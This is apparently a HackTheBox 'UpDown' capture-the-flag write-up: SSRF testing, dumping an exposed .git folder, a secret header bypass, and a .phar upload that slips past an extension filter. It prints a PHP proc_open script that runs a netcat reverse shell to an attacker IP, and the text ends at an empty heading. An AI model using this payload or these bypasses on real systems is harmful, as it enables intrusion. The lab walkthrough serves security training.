---
title: UpDown HackTheBox Writeup
tags: [writeup,python,git,hackthebox,linux,easy-install,php,.phar,proc_open]
style: border
color: success
description: ""
---

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjF1jdJKFLjieZGTgqjTxuAWn9wqli89CjChm5zelOh09ufDsqGbVFhNaqOYFlZZUuxwGbjIkF1p5XN9vvmH3KuzixK7Zx9meIslrE1kucdA-BfcXar7hzZmCsdbpmo5LatMrnSyWxcYT4i8xuLdMlCiuyqUaIwUB72r_J0YuppZdAdcTGue3DXhEACsA=w640-h485)](https://blogger.googleusercontent.com/img/a/AVvXsEjF1jdJKFLjieZGTgqjTxuAWn9wqli89CjChm5zelOh09ufDsqGbVFhNaqOYFlZZUuxwGbjIkF1p5XN9vvmH3KuzixK7Zx9meIslrE1kucdA-BfcXar7hzZmCsdbpmo5LatMrnSyWxcYT4i8xuLdMlCiuyqUaIwUB72r_J0YuppZdAdcTGue3DXhEACsA)

  

 Scanning
=========

We scan with **nmap** to all ports, with scripts and software versions::

[![](https://blogger.googleusercontent.com/img/a/AVvXsEisA0iL4kcC7ynnWANf4oBgsqzlhG5564bx0GcuKFTSnRzXP0WQ6i2JxHfpjNc-89cGjdmdGzT41rQs0FSyMNjbQJCNmoLdqBeHazpTbdf1nF51il0PXy6EB4emvdb03W2tsl6tW8gWcUxq6yRJIujAiVFni4xS3PCrsawGsSyqPi53mh4C3lj7RTlLWg=w640-h206)](https://blogger.googleusercontent.com/img/a/AVvXsEisA0iL4kcC7ynnWANf4oBgsqzlhG5564bx0GcuKFTSnRzXP0WQ6i2JxHfpjNc-89cGjdmdGzT41rQs0FSyMNjbQJCNmoLdqBeHazpTbdf1nF51il0PXy6EB4emvdb03W2tsl6tW8gWcUxq6yRJIujAiVFni4xS3PCrsawGsSyqPi53mh4C3lj7RTlLWg)

  

Enumeration
===========

We access the web resource, list the domain "_siteisup.htb_" and see a form to check websites.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhJA71ZSP-wjcPZzcVef3gtUJS0njfDJykTN2DoozfmAAFzf0gOW4RaiSQwYbYdUyCtMb8B9-eTUIBNoAAl-IZk2IkkizZGNTbbttEIAXsCL1-Y8SaFFroUQ4Jc_Mn6EYjPsJkS1ZpBKbPAxmaIDXzDscrMpOT6ba_rVWc_PA0uRhZIBu3W68gmRVUSyw=w640-h580)](https://blogger.googleusercontent.com/img/a/AVvXsEhJA71ZSP-wjcPZzcVef3gtUJS0njfDJykTN2DoozfmAAFzf0gOW4RaiSQwYbYdUyCtMb8B9-eTUIBNoAAl-IZk2IkkizZGNTbbttEIAXsCL1-Y8SaFFroUQ4Jc_Mn6EYjPsJkS1ZpBKbPAxmaIDXzDscrMpOT6ba_rVWc_PA0uRhZIBu3W68gmRVUSyw)

  
We tested the form in debug mode with "_google.com_", but we do not see any information in the "_debug mode_" field:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgdz4aGu3HSH299AN0flZpR6kaJLjcMgf9PBfZXFDmt8k7k7m3KlP3if0NwT_9iZPytKyuz4kGMgvhH2hgiHyAMh-sIu92Z5GbczOQNduCRNlQnnXfGAeX1LW_TS2NuIhNJ7qHDCdUFcFiIvxjwwbhBJbIYELc28qOqqLtd_zCpCrGO17l3h68iXCrW_w=w400-h258)](https://blogger.googleusercontent.com/img/a/AVvXsEgdz4aGu3HSH299AN0flZpR6kaJLjcMgf9PBfZXFDmt8k7k7m3KlP3if0NwT_9iZPytKyuz4kGMgvhH2hgiHyAMh-sIu92Z5GbczOQNduCRNlQnnXfGAeX1LW_TS2NuIhNJ7qHDCdUFcFiIvxjwwbhBJbIYELc28qOqqLtd_zCpCrGO17l3h68iXCrW_w)

  
We try to raise a server with **Python** and we see that the application does not like it:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEg7wPQXv8QYDagWoIe5ithAp70Bnp6ksF-QERqEYQQzURb654J0llSuBqtOUYj_PvK12MRrIsGAFlc4xQSxE9oo6g4jCbfoHdodyfBvli9chJKCtkFaug4FcOgkZuUS4t2TyAgOrvn5PvQ_GIWt3kzXwrdJGTI64J4hnFx-cXpmN_w8qAngomRz-l36WA=w627-h640)](https://blogger.googleusercontent.com/img/a/AVvXsEg7wPQXv8QYDagWoIe5ithAp70Bnp6ksF-QERqEYQQzURb654J0llSuBqtOUYj_PvK12MRrIsGAFlc4xQSxE9oo6g4jCbfoHdodyfBvli9chJKCtkFaug4FcOgkZuUS4t2TyAgOrvn5PvQ_GIWt3kzXwrdJGTI64J4hnFx-cXpmN_w8qAngomRz-l36WA)

  
We test now entering "_http_", intercept the request with **Burp** and we see that now it prints the header of our **Python** server and our files..

[![](https://blogger.googleusercontent.com/img/a/AVvXsEh1zIKzCbBTiXNd86VnZHGT73oZdrsTzscw8p8nJTAAcmI_7ACSjMUVJRhxvXtlTAJrJZG9rcTqfyTGpfc5fxTzgfPR-s7z8w-yG1IxZi1TOpyJqUvp_s-hOR3B0XMomO8db6xj_Emj7Vy4rKcfpNhbb-SgLkDKg1udwMshOt7TT0VshH2wZdQijfsVow=w640-h338)](https://blogger.googleusercontent.com/img/a/AVvXsEh1zIKzCbBTiXNd86VnZHGT73oZdrsTzscw8p8nJTAAcmI_7ACSjMUVJRhxvXtlTAJrJZG9rcTqfyTGpfc5fxTzgfPR-s7z8w-yG1IxZi1TOpyJqUvp_s-hOR3B0XMomO8db6xj_Emj7Vy4rKcfpNhbb-SgLkDKg1udwMshOt7TT0VshH2wZdQijfsVow)

  

We try to enter the IP address of the machine and we see that an _SSRF_ is generated.  

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjKrlBUPU4V6A6BOCDgngAFdLXqp203zxY-EriXXTZyEGyUD0HkJe-3LPnWasHovXitgnxNttCqIfbPqoAWmmfnvlIjONG9pQ3zR4pP2vwnPrel--4jRF4_nJsmDw4qvYe568ZpxO9a4FnXNv15UNEordl9V6aT6Tgogh8C4i4cPoCBA-JFehusmdwbBg=w640-h410)](https://blogger.googleusercontent.com/img/a/AVvXsEjKrlBUPU4V6A6BOCDgngAFdLXqp203zxY-EriXXTZyEGyUD0HkJe-3LPnWasHovXitgnxNttCqIfbPqoAWmmfnvlIjONG9pQ3zR4pP2vwnPrel--4jRF4_nJsmDw4qvYe568ZpxO9a4FnXNv15UNEordl9V6aT6Tgogh8C4i4cPoCBA-JFehusmdwbBg)

  
  

Testing, we see that some filters are being applied on some special characters, so I inserted a list of them and listed those that are allowed:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEivCY33yhoMxaJXSXGbdltNgpgi5q1roGmJ04C20WBcJF9kzIOL2WE5_tjwaWk375Jl3Vj_sSgXxz0L4Ncvh0jyWuBrKZL-AQp3szfnXqloB6eWEjHmtmAT-ZvWngc7YcBwTHuZHy3_8GfNZcs62PwawJrqv3Y8Mskw_XRzRq2RKS8MLEAUo7LiEiflPw=w640-h466)](https://blogger.googleusercontent.com/img/a/AVvXsEivCY33yhoMxaJXSXGbdltNgpgi5q1roGmJ04C20WBcJF9kzIOL2WE5_tjwaWk375Jl3Vj_sSgXxz0L4Ncvh0jyWuBrKZL-AQp3szfnXqloB6eWEjHmtmAT-ZvWngc7YcBwTHuZHy3_8GfNZcs62PwawJrqv3Y8Mskw_XRzRq2RKS8MLEAUo7LiEiflPw)

  

We tried to load some relevant files from the machine but nothing, we can't load external documents and execute code either.

  

We launch **dirsearch** looking for possible directories and files, we list the "_dev_" directory:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhtVkZJZfmwhlde60Zqf2X5hlRjHM4CZ_hv4Y21SfhviOYTmEzuZr9bnY7aRl2RIXlOajLPXnORHwCfbyIOSpMUcncWmHrzXSmXkxnJgIZ6TMFTMuOOyN5gmLQ5GuavO6ZQ7rukyUhpgTVaG7c74OP4WuGqNVOw9JQKNSgnVRIRRGeAEcL1fo-GNJ8IyQ=w640-h584)](https://blogger.googleusercontent.com/img/a/AVvXsEhtVkZJZfmwhlde60Zqf2X5hlRjHM4CZ_hv4Y21SfhviOYTmEzuZr9bnY7aRl2RIXlOajLPXnORHwCfbyIOSpMUcncWmHrzXSmXkxnJgIZ6TMFTMuOOyN5gmLQ5GuavO6ZQ7rukyUhpgTVaG7c74OP4WuGqNVOw9JQKNSgnVRIRRGeAEcL1fo-GNJ8IyQ)

  
We access the "_dev_" directory, but there seems to be nothing.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi4sdU_ECJQ7Ep-tJGnmOBJJRHVXLz9uw7_crMin7lgHqlnFC0IlcrS3MrxUB4IWhXZt2t8kJHo_2MsHjZcGnaJ9VzPEWSiC0rgSBjg0wcr1fmLb3Dy1P3oTnYVWVSjW2fVqAOaGrT-G5Wd46WrZSAaZfTZzfg-7TJDjWsAP4k37mR-7wy5DwQpZrgJ8Q=w400-h256)](https://blogger.googleusercontent.com/img/a/AVvXsEi4sdU_ECJQ7Ep-tJGnmOBJJRHVXLz9uw7_crMin7lgHqlnFC0IlcrS3MrxUB4IWhXZt2t8kJHo_2MsHjZcGnaJ9VzPEWSiC0rgSBjg0wcr1fmLb3Dy1P3oTnYVWVSjW2fVqAOaGrT-G5Wd46WrZSAaZfTZzfg-7TJDjWsAP4k37mR-7wy5DwQpZrgJ8Q)

  

We launch **wfuzz** to list possible subdomains, we find one called "_dev.siteisup.htb_":

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi5M7dsM6ovRiFmPQzS4xANf3GjpM2m2UAtZZ8eYGffGQwMGQ91VJkQhYxjFd3Zkfx0yNpepYipXQBme8U9VEaiaHRGNyhFOPSLtV8AGW3nCDCH1MeR2khmKNJbmquKh8vBYHtYiz5cjf86qdszQtF9QayNUfI_CgQndA266rPDYVXhfNEw2gqmD0RQ4Q=w640-h188)](https://blogger.googleusercontent.com/img/a/AVvXsEi5M7dsM6ovRiFmPQzS4xANf3GjpM2m2UAtZZ8eYGffGQwMGQ91VJkQhYxjFd3Zkfx0yNpepYipXQBme8U9VEaiaHRGNyhFOPSLtV8AGW3nCDCH1MeR2khmKNJbmquKh8vBYHtYiz5cjf86qdszQtF9QayNUfI_CgQndA266rPDYVXhfNEw2gqmD0RQ4Q)

  
We are trying to access the web resource but we do not have permissions:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjQy9elSkUrAAHXcK3ZdrWcz6HRGxiphDCGA7lZ-fsMPiNRfYH-cIEoY-0xGP1VCrZCdOVxyeFbB_0ZGQiiJcjtiBHjdBG-t9kE8A9fma7ICyyeBJXmgUg_hSEay7BZlQQl8NRjLOVvCnlWUvgOAa1cUQIPo2gmNrCSjYDg8HInLPBVPjafaECOmceUzA=w400-h151)](https://blogger.googleusercontent.com/img/a/AVvXsEjQy9elSkUrAAHXcK3ZdrWcz6HRGxiphDCGA7lZ-fsMPiNRfYH-cIEoY-0xGP1VCrZCdOVxyeFbB_0ZGQiiJcjtiBHjdBG-t9kE8A9fma7ICyyeBJXmgUg_hSEay7BZlQQl8NRjLOVvCnlWUvgOAa1cUQIPo2gmNrCSjYDg8HInLPBVPjafaECOmceUzA)

  
So we launch **dirsearch** again on the "_dev_" directory, we list a "_.git_" folder::

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiWTMnKSUifilcHIbU3wIv1pWudPeeCbHfR94qrPj12AcQOwcKviVhzy8tEADlY91SBr1jEWJ-5YfBKCNTBY1LwxDnjl3_SeLSieztZmvYqFjkKYbV9TE3iqt_2Eay_wXpzNnGaz7lR_EgzSGyS0oes0PKoM1ak7bgyqN-YMEWyXK_Sd3EuLQro5SNm4Q=w640-h488)](https://blogger.googleusercontent.com/img/a/AVvXsEiWTMnKSUifilcHIbU3wIv1pWudPeeCbHfR94qrPj12AcQOwcKviVhzy8tEADlY91SBr1jEWJ-5YfBKCNTBY1LwxDnjl3_SeLSieztZmvYqFjkKYbV9TE3iqt_2Eay_wXpzNnGaz7lR_EgzSGyS0oes0PKoM1ak7bgyqN-YMEWyXK_Sd3EuLQro5SNm4Q)

  
We already know this from other machines, so we download the "**gittools**" tool to download and extract the information from the "_.git_" folder on the server.

### Dumpeo of .git files

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgcWUa8TCULjiuwFT8bVb0_XIx_awnEP0k5qnVhlDA2gKaFLGwFNjjCeCew6H6dEGiC63eYFenv5lpBxaR9kYOj4n4VxH7XRbxYUbcWVlESPeKxQrGtxuufUQTJ-9BuzGAASWXcwQNIfpg6YC10qPcdev2eNr0yxxOI7IhUdYpPHgtbVg3D801qtLDGeQ=w640-h430)](https://blogger.googleusercontent.com/img/a/AVvXsEgcWUa8TCULjiuwFT8bVb0_XIx_awnEP0k5qnVhlDA2gKaFLGwFNjjCeCew6H6dEGiC63eYFenv5lpBxaR9kYOj4n4VxH7XRbxYUbcWVlESPeKxQrGtxuufUQTJ-9BuzGAASWXcwQNIfpg6YC10qPcdev2eNr0yxxOI7IhUdYpPHgtbVg3D801qtLDGeQ)

### Reading the "_config_" file:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEis5V4FHgLymspeY51iXDxLDFtyZYBiGzp2c2ONDcoFuDm9HeLorTkviDIqrKNy7Wl5uysmnqAI6lwuKaTGJgEIFQz9fHcXimAXRdk5I5L_gBm9Xy_yN9j6z5hyVcdWDFfnjrPzOMx0h4gaPufYhTINqp0bfEZQKcWUy-pynRLpYS_JNE4gscvXkNWIlQ=w400-h235)](https://blogger.googleusercontent.com/img/a/AVvXsEis5V4FHgLymspeY51iXDxLDFtyZYBiGzp2c2ONDcoFuDm9HeLorTkviDIqrKNy7Wl5uysmnqAI6lwuKaTGJgEIFQz9fHcXimAXRdk5I5L_gBm9Xy_yN9j6z5hyVcdWDFfnjrPzOMx0h4gaPufYhTINqp0bfEZQKcWUy-pynRLpYS_JNE4gscvXkNWIlQ)

  

_Note: The following evidences are shown with a change of look of my desktop and terminal._

  

We see the list of files:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgxcMputigFSHMKpz4-L1W4ICw_eITLzRqR-Jip5i2SYSbQZNywZ0crM46mCdyRaq3NlbRYQDCTTFo__YtXmsWU1V6tzhBzj2i0Qh9umHcMsq6hwDPsY1oaFIDwRNMAHt4Wk6d41LxJZa345O5lm3x6WyDJoYuHYGleuh_0_pRTFfYv2hHHspx3HsCFxg=w640-h188)](https://blogger.googleusercontent.com/img/a/AVvXsEgxcMputigFSHMKpz4-L1W4ICw_eITLzRqR-Jip5i2SYSbQZNywZ0crM46mCdyRaq3NlbRYQDCTTFo__YtXmsWU1V6tzhBzj2i0Qh9umHcMsq6hwDPsY1oaFIDwRNMAHt4Wk6d41LxJZa345O5lm3x6WyDJoYuHYGleuh_0_pRTFfYv2hHHspx3HsCFxg)

  

### $ git log

     commit 8812785e31c879261050e72e20f298ae8c43b565  
     Author: Abdou.Y   
     Date:  Wed Oct 20 16:38:54 2021 +0200  
       New technique in header to protect our dev vhost.  
    

We read the contents of _8812785e31c879261050e72e20f298ae8c43b565:_

     SetEnvIfNoCase Special-Dev "only4dev" Required-Header  
     Order Deny,Allow  
     Deny from All  
     Allow from env=Required-Header  
    

We add the header and we see that now we have access to the content of the website:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjTr8psot4EIGAyvKqne1sPf56WwnTCZlzz8bMjyXNgbkTcdcFwAHQMmel1hdEVkUYYf4xDUvdES5OsXw7aGi_WUzbCbOM9LUJdjLkJput8B4UKGT6LpjvI76mDhUr1qaPbOzKA6YqJ7kmkwe770eyX-ks3gd4QqeoPA9gnx6Ir4fGeDVegqvQKEIbM0w=w640-h300)](https://blogger.googleusercontent.com/img/a/AVvXsEjTr8psot4EIGAyvKqne1sPf56WwnTCZlzz8bMjyXNgbkTcdcFwAHQMmel1hdEVkUYYf4xDUvdES5OsXw7aGi_WUzbCbOM9LUJdjLkJput8B4UKGT6LpjvI76mDhUr1qaPbOzKA6YqJ7kmkwe770eyX-ks3gd4QqeoPA9gnx6Ir4fGeDVegqvQKEIbM0w)

  

### Visualization from the browser:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjPd7Uu7vXqn4vKbfFxiVDeqDeYHFS5a9n_ofeoTXCBh7rkeaIVEG8KIVSoTJoAGPv2Gl9KnFOUK0UduECkjgCR1leDrd9upftF1o8p7ZfvHpoBN5JL7epprLI-US3Ss03I79NnG58vJ7q-wxVfz4p1pmQimqK4saJoWw_MU_M20NZDln4iorhbCvn5ag=w640-h382)](https://blogger.googleusercontent.com/img/a/AVvXsEjPd7Uu7vXqn4vKbfFxiVDeqDeYHFS5a9n_ofeoTXCBh7rkeaIVEG8KIVSoTJoAGPv2Gl9KnFOUK0UduECkjgCR1leDrd9upftF1o8p7ZfvHpoBN5JL7epprLI-US3Ss03I79NnG58vJ7q-wxVfz4p1pmQimqK4saJoWw_MU_M20NZDln4iorhbCvn5ag)

  
I added the header "_Special-Dev: only4dev_" to the **Burp**, so that it would insert it automatically and I wouldn't miss any details:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgU8iDm_ENhM40Qb1fXeXZ_6-3LRm0CoX-OvPphcf5IEX-nWNwzR1MnE7T0-3JMLQes9YxRR9Tg4HLZ6p7WLQnLlLWnqgAxxNCP7Ie33GRIzjJkniVdG-qhgLdxaGsvCqdNJzTTEj1sEZCXLjdDIhs9411cFkTni4yXPI_4WiEOVovJxILEu2sSRUngnA=w640-h434)](https://blogger.googleusercontent.com/img/a/AVvXsEgU8iDm_ENhM40Qb1fXeXZ_6-3LRm0CoX-OvPphcf5IEX-nWNwzR1MnE7T0-3JMLQes9YxRR9Tg4HLZ6p7WLQnLlLWnqgAxxNCP7Ie33GRIzjJkniVdG-qhgLdxaGsvCqdNJzTTEj1sEZCXLjdDIhs9411cFkTni4yXPI_4WiEOVovJxILEu2sSRUngnA)

  
We try to upload a **PHP** file, but we see that it is not allowed:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiPdCIYCf5EGxQLaUKHsSSlbrQh4sqJjEY8bN3V26wSPJ433oJRD_EjhSj-lYNqytjRsyMhsDh9Jkn8PBr1W19AiPSm2CW8efmjFMoYM_s2PzEMv6o4rwCRwLWN6kAmgj-q6iaspP6N4b5OPNupw0iEBNnxPSNpRas1sA0zPpWjukdrK_XiRM-2pesoWA=w640-h428)](https://blogger.googleusercontent.com/img/a/AVvXsEiPdCIYCf5EGxQLaUKHsSSlbrQh4sqJjEY8bN3V26wSPJ433oJRD_EjhSj-lYNqytjRsyMhsDh9Jkn8PBr1W19AiPSm2CW8efmjFMoYM_s2PzEMv6o4rwCRwLWN6kAmgj-q6iaspP6N4b5OPNupw0iEBNnxPSNpRas1sA0zPpWjukdrK_XiRM-2pesoWA)

  
  

Checking the **git** files, we found one called "_checker.php_", these two functions reveal the forbidden file extensions. We also see that create a file in the "_uploads_" directory for the time in md5, we have already encountered this on other machines and we will solve it by making an automated script.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiPuDVhwkXrok4S1QgWRUaexO2CrKbEOwQAspRCxQoGy5QDuECp69bVkDJ0blQGppWNmK30OIop5AJzr1Mx6t7mLniZmMTW3zSYyX3mLb3iJKLX6AU-yPsaglppgI9nDMBGS0pVty7qfcG0_YVDuQU2cpD111mrdagDgdkQLzs4JZYJDTc28ko4PJQ4Vw=w640-h196)](https://blogger.googleusercontent.com/img/a/AVvXsEiPuDVhwkXrok4S1QgWRUaexO2CrKbEOwQAspRCxQoGy5QDuECp69bVkDJ0blQGppWNmK30OIop5AJzr1Mx6t7mLniZmMTW3zSYyX3mLb3iJKLX6AU-yPsaglppgI9nDMBGS0pVty7qfcG0_YVDuQU2cpD111mrdagDgdkQLzs4JZYJDTc28ko4PJQ4Vw)

  
Checking files, we found that the "_.phar_" is not contemplated, so it is possible that it will work.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi4908_BTyzbxWCOh4PRPVh6TTWi4oQkGD5Q0VtbKykyVDiBtoo75JTklMxiQu6gy7Dj3gIMe42lNf9-mBhRQBfC-zm1E99KkYfB_d2AsUL6Dp6TwyFHHkQcIU8PK-4dUgi2VYAumLSmhGijN4MO_ea6iwRaZbjpi_GzckvpROdYZ1sphx9nBNbSJ8q4Q=w640-h438)](https://blogger.googleusercontent.com/img/a/AVvXsEi4908_BTyzbxWCOh4PRPVh6TTWi4oQkGD5Q0VtbKykyVDiBtoo75JTklMxiQu6gy7Dj3gIMe42lNf9-mBhRQBfC-zm1E99KkYfB_d2AsUL6Dp6TwyFHHkQcIU8PK-4dUgi2VYAumLSmhGijN4MO_ea6iwRaZbjpi_GzckvpROdYZ1sphx9nBNbSJ8q4Q)

  

We see that it has passed the filtering, but it returns another error, we look for the error in the **git** files and we find these lines. It seems that it is doing a URL check to check if they are active or not and then this file is deleted.

  

Given this, we should try to delay this execution to give us enough time to execute our **PHP** code.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEj-La16CiQ8TL5hT0iatpH1th-TAvZMhIB3QsBoMKyeyGZyK0m0SxX0Xd12atBOztawKx1xCHsvIlxOg1NmgPBU8i1oDtkX3ThTX8ZFMA5OtbTLFE8ArijubjS0G56yKBIlJqT_qHrNiZCwAHQvSzrHmu89WbgfssHeqitVKrvfHN9GPQTwTNvUIAt4ig=w640-h214)](https://blogger.googleusercontent.com/img/a/AVvXsEj-La16CiQ8TL5hT0iatpH1th-TAvZMhIB3QsBoMKyeyGZyK0m0SxX0Xd12atBOztawKx1xCHsvIlxOg1NmgPBU8i1oDtkX3ThTX8ZFMA5OtbTLFE8ArijubjS0G56yKBIlJqT_qHrNiZCwAHQvSzrHmu89WbgfssHeqitVKrvfHN9GPQTwTNvUIAt4ig)

  
The luck we are going to have is that we are going to save code, since it is possible to list the folders generated in MD5, so we would only have to slow down the execution to give us enough time to read our code.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgt3xGKZ4duGDvEMHBs9Nibdyw-_q-AX5j2LPZ6zh0XeWms_fi2Z1oKQzhZqCoYd0j5JqZhwFILl752_MYshG7l9yyAsNQ4qVUKGxU9y_E068kbnml9MDN_Eq23_PFGGET5MXBaB4_qnyAb6rlPZwOfB1d4Cbi6d2r8z3QSmGf0WwqWvxUSu9ne96FFNA=w640-h276)](https://blogger.googleusercontent.com/img/a/AVvXsEgt3xGKZ4duGDvEMHBs9Nibdyw-_q-AX5j2LPZ6zh0XeWms_fi2Z1oKQzhZqCoYd0j5JqZhwFILl752_MYshG7l9yyAsNQ4qVUKGxU9y_E068kbnml9MDN_Eq23_PFGGET5MXBaB4_qnyAb6rlPZwOfB1d4Cbi6d2r8z3QSmGf0WwqWvxUSu9ne96FFNA)

  
And we see it works!

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhQwJzWXZlxSz09qgeZX6_QIZyOm4h_IxcWgUFY1QhilvAEW7g6t04W5VDwVmmSApMwceDEiEQwko_NuzHM4WiTfW5Cps-3ixxLsHY6iWTarxbRa08q7dg1QnaXzDqU9F5kdPR78Yw9X4JlkwjqbDvjeR6LHdMl6-cvQIu_zV__uRUwyyzVbNFjfqGq_g=w640-h348)](https://blogger.googleusercontent.com/img/a/AVvXsEhQwJzWXZlxSz09qgeZX6_QIZyOm4h_IxcWgUFY1QhilvAEW7g6t04W5VDwVmmSApMwceDEiEQwko_NuzHM4WiTfW5Cps-3ixxLsHY6iWTarxbRa08q7dg1QnaXzDqU9F5kdPR78Yw9X4JlkwjqbDvjeR6LHdMl6-cvQIu_zV__uRUwyyzVbNFjfqGq_g)

  
We take advantage of this file to check the disabled functions, we find "_shell\_exec_", "_popen_", "_passthru_", "_system_".... But we do not see "_preg\_replace_" disabled, so we could still make replacement and execute commands.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgrjkANjsiqNh-Mt3RK6mjPD4Rm0lcAH_n8VglFa0AwbvqEgbNhZ6kLuTrozTbqjP0OoTB32arEyvI7GWZa9JoL6Od_B47hueBMtMXVlmZnTPLOppX0HEAKg-_Qt5za0TzeZVvgisdKiZpOIp9ethf4PNOmAprCPCvQ9kElHR--k0NrGrE-iWlWc8TI4g=w640-h126)](https://blogger.googleusercontent.com/img/a/AVvXsEgrjkANjsiqNh-Mt3RK6mjPD4Rm0lcAH_n8VglFa0AwbvqEgbNhZ6kLuTrozTbqjP0OoTB32arEyvI7GWZa9JoL6Od_B47hueBMtMXVlmZnTPLOppX0HEAKg-_Qt5za0TzeZVvgisdKiZpOIp9ethf4PNOmAprCPCvQ9kElHR--k0NrGrE-iWlWc8TI4g)

  

We tried to insert a _preg\_replace_, but it doesn't work.:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjW4lJ_WqH5eawW6KkiHuhCOZcD42CZiYOgOODdLlu1pUcRkCKtQKzVxWhGZipCZtykOiBjV-eFexQpUV-TR6KXOLWD4FuEIoDnj_GHLHeQL-cJD4AwG6KeSZB1m1x0XhFZZiiqjBdKEjImgDdcFLFXut5YEyg7JqiVzHXQ0QFyfaZW13CLoWe6DogZQA=w640-h354)](https://blogger.googleusercontent.com/img/a/AVvXsEjW4lJ_WqH5eawW6KkiHuhCOZcD42CZiYOgOODdLlu1pUcRkCKtQKzVxWhGZipCZtykOiBjV-eFexQpUV-TR6KXOLWD4FuEIoDnj_GHLHeQL-cJD4AwG6KeSZB1m1x0XhFZZiiqjBdKEjImgDdcFLFXut5YEyg7JqiVzHXQ0QFyfaZW13CLoWe6DogZQA)

  
Searching the internet, I discovered that with proc\_open you can also execute code: [PHP: proc\_open - Manual](https://www.php.net/manual/en/function.proc-open.php)

  
```php
     <?php  
     $descriptorspec = array(  
       0 => array("pipe", "r"), // stdin is a pipe that the child will read from  
       1 => array("pipe", "w"), // stdout is a pipe that the child will write to  
       2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to  
     );  
     $cwd = '/tmp';  
     $env = array('some_option' => 'aeiou');  
     $process = proc_open('php', $descriptorspec, $pipes, $cwd, $env);  
     if (is_resource($process)) {  
       // $pipes now looks like this:  
       // 0 => writeable handle connected to child stdin  
       // 1 => readable handle connected to child stdout  
       // Any error output will be appended to /tmp/error-output.txt  
       fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f');  
       fclose($pipes[0]);  
       echo stream_get_contents($pipes[1]);  
       fclose($pipes[1]);  
       // It is important that you close any pipes before calling  
       // proc_close in order to avoid a deadlock  
       $return_value = proc_close($process);  
       echo "command returned $return_value\n";  
     }  
     ?>
```
    

So I mounted these lines in my "_shell.phar_" file and saw that it worked!

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjTnYHA1qg0fA6WAIt8-Xhi7eFD49nNQYwES_UR2wrYu6Axn734E1kmaZ99FdzOUSBBcOA2_8ODLC6nuCU2rS9ynn9Oo3iWgBNLUEjkczeAlmV3eirosVfgliH8B36t5OFZ8b1NGcoW0CAyQfpGkl_iYMsYxXvx1Y2i4d2tYXMuMWwvufSBjwJrGpx18Q=w640-h282)](https://blogger.googleusercontent.com/img/a/AVvXsEjTnYHA1qg0fA6WAIt8-Xhi7eFD49nNQYwES_UR2wrYu6Axn734E1kmaZ99FdzOUSBBcOA2_8ODLC6nuCU2rS9ynn9Oo3iWgBNLUEjkczeAlmV3eirosVfgliH8B36t5OFZ8b1NGcoW0CAyQfpGkl_iYMsYxXvx1Y2i4d2tYXMuMWwvufSBjwJrGpx18Q)

  
We try to read the user flag, but we don't have permissions, we can't read the **SSH** key either, so for the moment we can only see some .py files:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhlIeg2DkMaVjhNmEgJdjOoGh7X1RNnHadIU_zzqomYjgLdzQSux2kSclt0tthGcsZPM2I7b-erh6fy-BUuwdYLgjfc378axE09Fwum4dfIExgCAxb1pC8O9fVswJRSxLN6u6Z-Lfudh9rB3M8YHNau9dVJRWRYFSFcTjm2_uf636w0XEQTFFWC7EwXMA=w552-h640)](https://blogger.googleusercontent.com/img/a/AVvXsEhlIeg2DkMaVjhNmEgJdjOoGh7X1RNnHadIU_zzqomYjgLdzQSux2kSclt0tthGcsZPM2I7b-erh6fy-BUuwdYLgjfc378axE09Fwum4dfIExgCAxb1pC8O9fVswJRSxLN6u6Z-Lfudh9rB3M8YHNau9dVJRWRYFSFcTjm2_uf636w0XEQTFFWC7EwXMA)

  

### Type file siteisup:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgZuAL7ItlKkqR6se9OWPYMVKWeL8mhhata-VeqxrQ0MZCvG92nUfFtzi2J7uxvwM602EMciXv7us8iMHltfIpZ3D7IR9S9EKh-KhZk5DAoE1qCp07HP974q5cnv84CmGqR8b_kTZTApqHYkttMSRZPEWnhV9z-WYc4o-WPi2csBrSUjzFq6FN3pjv34Q=w640-h66)](https://blogger.googleusercontent.com/img/a/AVvXsEgZuAL7ItlKkqR6se9OWPYMVKWeL8mhhata-VeqxrQ0MZCvG92nUfFtzi2J7uxvwM602EMciXv7us8iMHltfIpZ3D7IR9S9EKh-KhZk5DAoE1qCp07HP974q5cnv84CmGqR8b_kTZTApqHYkttMSRZPEWnhV9z-WYc4o-WPi2csBrSUjzFq6FN3pjv34Q)

  

### Content file siteisup\_test.py:

